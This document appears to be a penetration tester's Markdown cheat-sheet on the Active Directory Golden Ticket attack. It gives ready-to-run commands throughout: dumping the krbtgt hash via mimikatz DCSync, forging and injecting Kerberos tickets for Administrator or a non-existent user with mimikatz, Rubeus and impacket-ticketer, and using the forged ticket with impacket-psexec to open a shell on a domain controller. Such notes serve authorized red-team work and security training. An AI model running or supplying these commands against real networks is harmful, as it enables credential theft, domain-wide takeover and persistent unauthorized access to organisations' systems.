---
tags:
  - Foundational
  - Privilege_Escalation
  - Windows
---

## Golden Ticket
resources: [HackTricks Golden Ticket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket)

> [!info] Forge a TGT for any user (including non-existent users). Requires the **krbtgt** hash from DCSync or NTDS.dit extraction. Provides domain-wide persistence.

### Prerequisites
> [!important] Need **krbtgt** hash and domain SID.

```powershell
# Get domain SID
(Get-ADDomain).DomainSID.Value
```

```powershell
# Get krbtgt hash via DCSync
.\mimikatz.exe "lsadump::dcsync /domain:<Domain> /user:krbtgt" "exit"
```

### Create Golden Ticket with Mimikatz [Remote]
```powershell
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /krbtgt:<KrbtgtHash> /ptt" "exit"
```

```powershell
# Save to file instead of injecting
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /krbtgt:<KrbtgtHash> /ticket:golden.kirbi" "exit"
```

```powershell
# Specify user ID (500 = default Administrator)
.\mimikatz.exe "kerberos::golden /user:FakeAdmin /domain:<Domain> /sid:<DomainSID> /krbtgt:<KrbtgtHash> /id:500 /ptt" "exit"
```

### Create Golden Ticket with Rubeus [alternative]
```powershell
.\Rubeus.exe golden /rc4:<KrbtgtHash> /user:Administrator /domain:<Domain> /sid:<DomainSID> /ptt
```

### Create Golden Ticket from Kali [Local]
```bash
impacket-ticketer -nthash <KrbtgtHash> -domain-sid <DomainSID> -domain <Domain> Administrator
```

```bash
# Use the ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <Domain>/Administrator@<TargetDC>
```

### Verify Ticket
```powershell
klist
```
